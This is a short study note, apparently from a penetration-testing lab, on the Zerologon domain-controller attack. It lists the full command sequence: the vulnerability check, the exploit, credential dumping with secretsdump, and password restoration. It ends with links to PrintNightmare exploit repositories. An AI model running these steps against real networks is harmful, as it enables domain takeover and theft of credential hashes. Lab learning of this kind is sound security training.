Zerologon is a very dangerous attack. Basically we're attacking the DC, setting the password to null and then taking over it. The problem is, if we run this and we do not restore the password, it will break the DC.

Please use it at your own risk. I do not condone any malicious attacks on anyone! 

What is ZeroLogon: [https://www.trendmicro.com/en_us/what-is/zerologon.html](https://www.trendmicro.com/en_us/what-is/zerologon.html)

dirkjanm CVE-2020-1472: 
https://github.com/dirkjanm/CVE-2020-1472

First, we will run the Zerologon checker script on the domain controller to see if we can run zerologon on it. 

```bash
python3 zerologon_check.py <Name_of_DC> <IP_Address>
```

Then we run the cve exploit script instead of the zerologon script with the same inputs.

Then run secretsdump on this:

```bash
secretsdump.py -just-dc MARVEL/HYDRA-DC\$<ip>
```

To restore this, we need to copy the administrator hash, then do another secretsdump:

```bash
secretsdump.py administrator@<ip> -hashes <hash>
```

We are then looking for a plain password hex. This is what we'll be using to restore the domain.

Then we run the restoring script:

```bash
python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip <ip> -hexpass <plain_password_hex>
```

Links:

cube0x0 RCE: 
https://github.com/cube0x0/CVE-2021-1675

calebstewart LPE:
https://github.com/calebstewart/CVE-2021-1675